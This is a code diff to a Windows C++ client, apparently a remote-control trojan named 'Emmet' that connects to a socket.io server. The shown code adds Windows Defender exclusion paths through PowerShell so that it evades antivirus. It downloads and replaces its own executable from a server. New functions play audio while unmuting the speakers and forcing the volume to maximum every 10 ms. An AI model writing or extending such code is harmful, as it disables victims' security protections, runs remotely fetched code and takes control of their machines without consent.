@@ -4,6 +4,7 @@
 #pragma comment (lib,"gdiplus.lib")
 #pragma comment(lib, "urlmon.lib")
 #pragma comment(lib, "Winmm.lib")
+#pragma comment(lib, "Mmdevapi.lib")
 #include <iostream>
 #include <Windows.h>
 #include <gdiplus.h>
@@ -16,6 +17,8 @@
 #include <vector>
 #include <sstream>
 #include <mmsystem.h>
+#include <Mmdeviceapi.h>
+#include <Endpointvolume.h>
 
 using namespace Gdiplus;
 
@@ -36,8 +39,157 @@ sio::client client;
 int liveDelay = 100;
 int discoDelay = 100;
 const std::string server = "http://localhost:3000";
-const std::string VERSION = "2.4";
+const std::string VERSION = "2.5";
 const char base64Table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+
+DWORD GetMP3Duration(const char* filePath)
+{
+	char cmd[1024];
+	sprintf(cmd, "open \"%s\" type MPEGVideo alias mp3", filePath);
+	mciSendStringA(cmd, NULL, 0, NULL);
+
+	char durationStr[128];
+	mciSendStringA("status mp3 length", durationStr, sizeof(durationStr), NULL);
+
+	DWORD duration = atoi(durationStr);
+	mciSendStringA("close mp3", NULL, 0, NULL);
+	return duration;
+}
+
+void UnmuteSpeakers() 
+{
+	HRESULT hr;
+	IMMDeviceEnumerator* pEnumerator = NULL;
+	IMMDevice* pDevice = NULL;
+	IAudioEndpointVolume* pVolume = NULL;
+	BOOL mute;
+
+	// Initialize COM
+	hr = CoInitialize(NULL);
+	if (FAILED(hr)) {
+		return;
+	}
+
+	// Get the enumerator for the audio endpoint devices
+	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+	// Get the default audio endpoint device
+	hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+	// Get the endpoint volume interface
+	hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pVolume);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+	// Get the current mute state of the speakers
+	hr = pVolume->GetMute(&mute);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+	// Unmute the speakers if they are currently muted
+	if (mute) {
+		hr = pVolume->SetMute(FALSE, NULL);
+		if (FAILED(hr)) {
+			goto Exit;
+		}
+	}
+
+Exit:
+	// Release resources
+	if (pVolume != NULL) {
+		pVolume->Release();
+	}
+	if (pDevice != NULL) {
+		pDevice->Release();
+	}
+	if (pEnumerator != NULL) {
+		pEnumerator->Release();
+	}
+	CoUninitialize();
+}
+
+void SetMaxVolume() 
+{
+	HRESULT hr;
+	IMMDeviceEnumerator* pEnumerator = NULL;
+	IMMDevice* pDevice = NULL;
+	IAudioEndpointVolume* pVolume = NULL;
+	float newVolume = 1.0f; // 100% volume
+
+	// Initialize COM
+	hr = CoInitialize(NULL);
+	if (FAILED(hr)) {
+		return;
+	}
+
+	// Get the enumerator for the audio endpoint devices
+	hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_ALL, __uuidof(IMMDeviceEnumerator), (void**)&pEnumerator);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+	// Get the default audio endpoint device
+	hr = pEnumerator->GetDefaultAudioEndpoint(eRender, eMultimedia, &pDevice);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+	// Get the endpoint volume interface
+	hr = pDevice->Activate(__uuidof(IAudioEndpointVolume), CLSCTX_ALL, NULL, (void**)&pVolume);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+	// Set the master volume level
+	hr = pVolume->SetMasterVolumeLevelScalar(newVolume, NULL);
+	if (FAILED(hr)) {
+		goto Exit;
+	}
+
+Exit:
+	// Release resources
+	if (pVolume != NULL) {
+		pVolume->Release();
+	}
+	if (pDevice != NULL) {
+		pDevice->Release();
+	}
+	if (pEnumerator != NULL) {
+		pEnumerator->Release();
+	}
+	CoUninitialize();
+}
+
+void KeepVolume(int duration)
+{
+	int time = 0;
+
+	while (true)
+	{
+		UnmuteSpeakers();
+		SetMaxVolume();
+		Sleep(10);
+		time += 10;
+		if (time > duration)
+		{
+			mciSendString(L"close mp3", NULL, 0, NULL);
+			break;
+		}
+	}
+}
+
+std::wstring StringToWstring(const std::string& str) {
+	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
+	return converter.from_bytes(str);
+}
 
 bool IsConnectedToInternet()
 {
@@ -75,7 +227,7 @@ std::string Base64Encode(const std::string& in)
 	return out;
 }
 
-std::string get_current_username() {
+std::string GetCurrentUsername() {
 	char buffer[256];
 	DWORD size = sizeof(buffer);
 	if (GetUserNameA(buffer, &size)) {
@@ -84,6 +236,19 @@ std::string get_current_username() {
 	else {
 		return "";
 	}
+}
+
+void PlayMp3(const std::string& filename)
+{
+	int duration = GetMP3Duration(filename.c_str());
+
+	std::string command = "open \"" + filename + "\" type mpegvideo alias mp3";
+	std::wstring editedCommand = StringToWstring(command);
+	mciSendString(editedCommand.c_str(), NULL, 0, NULL);
+
+	mciSendString(L"play mp3", NULL, 0, NULL);
+
+	KeepVolume(duration);
 }
 
 void ClickAtPosition(int x, int y) 
@@ -1006,7 +1171,7 @@ void InstallEmmetBat(std::string path, std::string wantedDir)
 	std::cout << "New directory created. OK." << std::endl;
 
 	//Anti Virus
-	std::string addDownloadsException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"C:\\Users\\" + get_current_username() + "\\Downloads\"\"";
+	std::string addDownloadsException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"C:\\Users\\" + GetCurrentUsername() + "\\Downloads\"\"";
 	system(addDownloadsException.c_str());
 
 	std::string addFileException = "Powershell.exe -Command \"Add-MpPreference -ExclusionPath \"" + wantedDir + "\"\"";
@@ -1056,7 +1221,7 @@ void UpdateBat(std::string actualFileName, std::string dir)
 
 void Update(std::string actualFileName, std::string dir)
 {
-	std::wstring fileOnServer = L"http://141.147.43.219:3000/ftp/EmmetPROD.exe";
+	std::wstring fileOnServer = L"http://localhost:3000/ftp/EmmetPROD.exe";
 
 	std::string destinationFile = dir + "\\z.exe";
 
